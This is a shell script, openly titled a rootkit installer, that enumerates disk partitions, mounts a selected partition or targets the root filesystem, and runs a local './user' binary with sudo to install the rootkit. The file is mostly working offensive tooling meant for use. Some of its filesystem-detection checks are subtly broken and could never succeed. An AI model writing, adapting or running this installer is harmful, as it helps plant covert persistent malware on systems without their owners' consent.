#!/bin/sh

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

MAX_SIZE_GB=256  # maximum volume

sudo_cmd="sudo"

if ! command -v sudo >/dev/null 2>&1; then
    sudo_cmd=""
fi

# confirm function
confirm_action() {
    local message="$1"
    printf "${YELLOW}%s${NC}\n" "$message"
    printf "Continue? [y/n]: "
    read confirmation
    [ "$confirmation" = "y" ]
}

check_disk_size() {
    local disk="$1"
    local disk_name=$(basename "$disk")
    local size_sectors=$(cat /sys/block/${disk_name%%[0-9]*}/size 2>/dev/null)
    [ -z "$size_sectors" ] && return 1

    local size_bytes=$((size_sectors * 512))
    local size_gb=$((size_bytes / 1024 / 1024 / 1024))

    if [ "$ALLOW_LARGE_DISKS" = "false" ] && [ "$size_gb" -gt "$MAX_SIZE_GB" ]; then
        printf "${RED}Fail: The disk size is %dGB, which exceeds (%dGB)${NC}\n" "$size_gb" "$MAX_SIZE_GB"
        printf "${BLUE}Info: If you still want to do it, please use --allow-large-disks parameter${NC}\n"
        return 1
    fi
    return 0
}

list_parts() {
    printf "\n${GREEN}Partition List:${NC}\n"
    printf -- "----------------------------------------\n"
    counter=0

    # Function to detect filesystem type
    detect_fstype() {
        local device="$1"
        local fstype=""

        if command -v blkid >/dev/null; then
            fstype=$(blkid -o value -s TYPE "$device" 2>/dev/null)
            [ -n "$fstype" ] && printf "%s\n" "$fstype" && return
        fi

        if dd if="$device" bs=1 count=3 skip=54 2>/dev/null | grep -q "NTFS"; then
            printf "ntfs\n"
        elif dd if="$device" bs=1 count=4 skip=82 2>/dev/null | grep -q "FAT"; then
            printf "vfat\n"
        elif dd if="$device" bs=1 count=2 skip=1080 2>/dev/null | grep -q "BTRFS"; then
            printf "btrfs\n"
        elif dd if="$device" bs=1 count=2 skip=56 2>/dev/null | grep -q "EXT"; then
            printf "ext\n"
        else
            printf "unknown\n"
        fi
    }

    for block in /sys/block/*; do
        [ ! -d "$block" ] && continue
        local disk_name=$(basename "$block")

        case "$disk_name" in
            loop*|ram*|sr*) continue ;;
        esac

        for part in $block/$disk_name*; do
            [ "$part" = "$block" ] && continue
            [ ! -f "$part/size" ] && continue

            local part_name=$(basename "$part")
            local part_dev="/dev/$part_name"
            local part_size_sectors=$(cat $part/size)
            local part_size_mb=$((part_size_sectors * 512 / 1024 / 1024))
            local part_size_gb=$(echo "scale=1; $part_size_sectors * 512 / 1024 / 1024 / 1024" | bc)

            local mountpoint=""
            while read -r dev mnt _; do
                if [ "$dev" = "$part_dev" ]; then
                    mountpoint="$mnt"
                    break
                fi
            done < /proc/mounts

            local fstype=$(detect_fstype "$part_dev")

            case "$fstype" in
                "ext4")   fs_color="${GREEN}" ;;
                "ext3"|"ext2") fs_color="${YELLOW}" ;;
                "xfs"|"btrfs") fs_color="${GREEN}" ;;
                "vfat"|"ntfs") fs_color="${YELLOW}" ;;
                "swap")   fs_color="${RED}" ;;
                *)        fs_color="${NC}" ;;
            esac

            counter=$((counter + 1))
            if [ $counter -le 10 ]; then
                eval "disk_map_$counter=\"$part_dev\""
            fi

            if [ $part_size_mb -lt 1024 ]; then
                printf "%d. %s | Size: %dM | Filesystem: ${fs_color}%s${NC} | Mount Point: %s\n" \
                    "$counter" "$part_dev" "$part_size_mb" "$fstype" "$mountpoint"
            else
                printf "%d. %s | Size: %.1fG | Filesystem: ${fs_color}%s${NC} | Mount Point: %s\n" \
                    "$counter" "$part_dev" "$part_size_gb" "$fstype" "$mountpoint"
            fi
        done
    done

    printf -- "----------------------------------------\n"
    total_devices=$counter
}

get_partition_uuid() {
    local partition="$1"
    local uuid=""
    for link in /dev/disk/by-uuid/*; do
        if [ "$(readlink -f "$link")" = "$partition" ]; then
            uuid=$(basename "$link")
            break
        fi
    done
    printf "%s\n" "$uuid"
    return 0
}

install_by_root() {
    local root="$1"
    printf "${YELLOW}Installing rootkit on %s${NC}\n" "$root"
    (
        set -x
        ${sudo_cmd} ./user "$root"
    )
}

install() {
    local part="$1"
    local mount_dir="/tmpdir"

    local current_mount=""
    while read -r dev mnt _; do
        if [ "$dev" = "$part" ]; then
            current_mount="$mnt"
            break
        fi
    done < /proc/mounts

    if [ -n "$current_mount" ]; then
        printf "%s is mounted at %s\n" "$part" "$current_mount"
        mount_dir="$current_mount"
    else
        printf "${YELLOW}%s is going to be mounted at %s${NC}\n" "$part" "$mount_dir"
        ${sudo_cmd} mkdir -p "$mount_dir" || { printf "${RED}Cannot create %s${NC}\n" "$mount_dir"; exit 1; }
        ${sudo_cmd} mount "$part" "$mount_dir" || { printf "${RED}Mount Fail${NC}\n"; exit 1; }
        printf "${GREEN}Successfully Mounted %s -> %s${NC}\n" "$part" "$mount_dir"
    fi

    install_by_root "$mount_dir"

    if [ -z "$current_mount" ]; then
        ${sudo_cmd} umount "$mount_dir"
        rm -rf "$mount_dir"
    fi
}

operate_on_part() {
    local disk="$1"

    printf "\n${GREEN}Selected Disk Partition: ${RED}%s${NC}\n" "$disk"
    printf "${YELLOW}Notice: some of the following operations will delete all the data permanently${NC}\n"
    printf "Operations:\n"
    printf "1. Install\n"
    printf "2. Exit\n"

    printf "Choose Operation (1-2): "
    read operation

    case "$operation" in
        1)
            if confirm_action "Are you sure to install rootkit on $disk ?"; then
                printf "${YELLOW}Installing...${NC}\n"
                install "$disk"
                printf "${GREEN}Done${NC}\n"
            else
                printf "${YELLOW}Operation Cancelled${NC}\n"
            fi
            ;;
        2)
            printf "Exiting...\n"
            exit 0
            ;;
        *)
            printf "${RED}Invalid Operation${NC}\n"
            ;;
    esac
}

clear
printf "${GREEN}Attack${NC}\n"
printf "${RED}Warning: THIS WILL POTENTIALLY CAUSE IRREVERSIBLE DAMAGE TO THE SYSTEM${NC}\n"
printf "========================================\n"

on_part() {
    while true; do
        list_parts
        if [ "$total_devices" -eq 0 ]; then
            printf "${YELLOW}No Part${NC}\n"
            exit 1
        fi

        printf "Choose Partition (1-%d) or Enter 'q' to Exit : " "$total_devices"
        read selection

        if [ "$selection" = "q" ]; then
            printf "Exiting...\n"
            exit 0
        elif [ "$selection" -ge 1 ] && [ "$selection" -le "$total_devices" ]; then
            eval "selected_disk=\"\$disk_map_$selection\""
            printf "\n${GREEN}Chosen Device:${NC}\n"

            local disk_name=$(basename "$selected_disk")
            local size_sectors=$(cat "/sys/class/block/$disk_name/size" 2>/dev/null)
            local size_gb=$(echo "scale=1; $size_sectors * 512 / 1024 / 1024 / 1024" | bc)
            local fstype=$(blkid -o value -s TYPE "$selected_disk" 2>/dev/null || printf "")
            local mountpoint=$(awk -v dev="$selected_disk" '$1 == dev {print $2}' /proc/mounts 2>/dev/null || printf "")

            printf "NAME           SIZE   FSTYPE MOUNT\n"
            printf "%-13s %6.1fG %-6s %s\n" \
                   "$disk_name" \
                   "$size_gb" \
                   "$fstype" \
                   "$mountpoint"

            operate_on_part "$selected_disk"

            printf "Press Enter to continue or 'q' to exit..."
            read continue
            if [ "$continue" = "q" ]; then
                exit 0
            fi
            clear
        else
            printf "${RED}Invalid choice, please try again${NC}\n"
        fi
    done
}

on_root() {
    if confirm_action "Are you sure to install rootkit on root ?"; then
            install_by_root /
    else
        printf "${YELLOW}Operation Cancelled${NC}\n"
    fi
}

while true; do
    printf "\n${GREEN}Rootkit Installer:${NC}\n"
    printf "${YELLOW}Notice: some of the following operations will delete all the data permanently${NC}\n"
    printf "Operations:\n"
    printf "1. Install on root\n"
    printf "2. Install on partition\n"
    printf "3. Exit\n"

    printf "Choose Operation (1-3): "
    read operation

    case "$operation" in
        1)
            on_root
            ;;
        2)
            on_part
            ;;
        3)
            printf "Exiting...\n"
            exit 0
            ;;
        *)
            printf "${RED}Invalid Operation${NC}\n"
            ;;
    esac
done